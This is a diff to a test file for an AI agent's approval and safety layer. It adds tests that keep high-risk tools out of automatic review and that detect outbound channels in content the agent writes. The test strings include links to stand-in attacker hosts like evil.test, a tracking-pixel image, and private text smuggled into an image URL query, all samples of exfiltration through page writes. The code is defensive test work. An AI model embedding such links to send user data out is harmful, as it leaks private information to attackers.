@@ -4,6 +4,10 @@ import {
   ACTION_TYPES,
   actionTypeForTool,
   applyJudgeDecision,
+  backgroundAutoReviewAllowed,
+  contentHasOutboundChannel,
+  mailModifyTouchesFixedLabel,
+  pageWriteAddsChannel,
   botAllowsAllSites,
   buildApprovalTable,
   connectorKindFromToolName,
@@ -852,12 +856,12 @@ describe("unattendedToolRequiresApproval", () => {
     expect(unattendedToolRequiresApproval(true, "mail_send", false)).toBe(true);
   });
 
-  it.each([
-    "cap_table_read",
-    "page_source_list",
-  ])("still asks for %s in an unattended run", (name) => {
-    expect(unattendedToolRequiresApproval(true, name, false)).toBe(true);
-  });
+  it.each(["cap_table_read", "page_source_list"])(
+    "still asks for %s in an unattended run",
+    (name) => {
+      expect(unattendedToolRequiresApproval(true, name, false)).toBe(true);
+    },
+  );
 
   it("keeps an internal legal tool asking in a tainted run", () => {
     expect(externalTaintAllowsTool("legal_upsert_contract")).toBe(false);
@@ -1189,5 +1193,139 @@ describe("routine rules and Auto Review of routine reads", () => {
         ],
       }),
     ).toBe(true);
+  });
+});
+
+describe("backgroundAutoReviewAllowed", () => {
+  const clean = {
+    enabled: true,
+    trigger: "routine",
+    tainted: false,
+    outsideContentSeen: false,
+    meetingMarked: false,
+    firewalled: false,
+    externalBot: false,
+    ownerWords: "Summarize my cap table every Monday.",
+    toolName: "cap_table_read",
+  };
+
+  it("allows a clean run's ordinary call", () => {
+    expect(backgroundAutoReviewAllowed(clean)).toBe(true);
+    expect(
+      backgroundAutoReviewAllowed({
+        ...clean,
+        toolName: "notion_create_page",
+        viaConnector: true,
+        connectorKind: "notion",
+      }),
+    ).toBe(true);
+  });
+
+  it.each([
+    ["background off", { enabled: false }],
+    ["webhook", { trigger: "webhook" }],
+    ["tainted run", { tainted: true }],
+    ["outside content", { outsideContentSeen: true }],
+    ["meeting mark", { meetingMarked: true }],
+    ["firewalled", { firewalled: true }],
+    ["external bot", { externalBot: true }],
+    ["empty owner words", { ownerWords: "  " }],
+  ])("never judges: %s", (_label, patch) => {
+    expect(backgroundAutoReviewAllowed({ ...clean, ...patch })).toBe(false);
+  });
+
+  it.each([
+    "schedule_create",
+    "schedule_update",
+    "schedule_cancel",
+    "skill_create",
+    "skill_update",
+    "skill_delete",
+    "remember",
+    "save_memory",
+    "save_shared_memory",
+    "forget_memory",
+    "mail_send",
+    "mail_draft",
+    "message_outside",
+    "imessage_send",
+    "calendar_create_event",
+    "calendar_delete_event",
+    "gtm_post",
+    "add_mcp_server",
+    "spawn_bot",
+    "update_bot",
+    "cloud_agent_launch",
+    "share_meeting",
+    "fundraising_round_save",
+  ])("never judges %s", (toolName) => {
+    expect(backgroundAutoReviewAllowed({ ...clean, toolName })).toBe(false);
+  });
+
+  it("never judges a money, message or calendar connector call", () => {
+    for (const [toolName, connectorKind] of [
+      ["stripe_create_charge", "stripe"],
+      ["slack_post_message", "slack"],
+      ["google_calendar_create_event", "googlecalendar"],
+    ] as const) {
+      expect(
+        backgroundAutoReviewAllowed({ ...clean, toolName, viaConnector: true, connectorKind }),
+      ).toBe(false);
+    }
+  });
+});
+
+describe("contentHasOutboundChannel", () => {
+  it("accepts plain text", () => {
+    expect(
+      contentHasOutboundChannel({ page: "Notes", content: "Call Sam on Monday at 3pm." }),
+    ).toBe(false);
+  });
+  it.each([
+    "see https://evil.test/x",
+    "![pixel](https://evil.test/p.png)",
+    "[click](mailto:a@b.test)",
+    "<img src=x>",
+    "visit evil.com now",
+    "www.evil.test",
+  ])("rejects %s", (text) => {
+    expect(contentHasOutboundChannel({ content: text })).toBe(true);
+    expect(contentHasOutboundChannel({ nested: [{ deep: text }] })).toBe(true);
+  });
+});
+
+describe("mailModifyTouchesFixedLabel", () => {
+  it("flags trash and spam, not archive", () => {
+    expect(mailModifyTouchesFixedLabel({ addLabels: ["trash"] })).toBe(true);
+    expect(mailModifyTouchesFixedLabel({ addLabels: ["SPAM"] })).toBe(true);
+    expect(mailModifyTouchesFixedLabel({ id: "m", archive: true })).toBe(false);
+  });
+});
+
+describe("pageWriteAddsChannel", () => {
+  const page = "Notes\n\n![logo](https://cdn.example.test/logo.png)\n";
+  it("allows plain edits to a page without links", () => {
+    expect(pageWriteAddsChannel("Notes", "My notes")).toBe(false);
+  });
+  it("catches private text swapped into an existing image URL", () => {
+    expect(
+      pageWriteAddsChannel(page, page.replace("logo.png", "logo.png?d=PLACEHOLDER-CUSTOMER")),
+    ).toBe(true);
+  });
+  it("rejects a new link, any HTML, and any URL on a new page", () => {
+    expect(pageWriteAddsChannel(page, `${page}\nsee https://evil.test`)).toBe(true);
+    expect(pageWriteAddsChannel("", "<b>hi</b>")).toBe(true);
+    expect(pageWriteAddsChannel("", "go to https://x.test")).toBe(true);
+  });
+});
+
+describe("pageWriteAddsChannel destinations", () => {
+  it("asks for nested parentheses, reference images and any destination", () => {
+    expect(pageWriteAddsChannel("", "![x](https://evil.test/a(b)?d=PLACEHOLDER)")).toBe(true);
+    expect(
+      pageWriteAddsChannel("![x][r]\n\n[r]: https://e.test/p", "![x][r]\n\n[r]: https://e.test/p"),
+    ).toBe(true);
+    expect(pageWriteAddsChannel("", "![x][r]\n[r]: foo")).toBe(true);
+    expect(pageWriteAddsChannel("", "Plain notes.")).toBe(false);
   });
 });
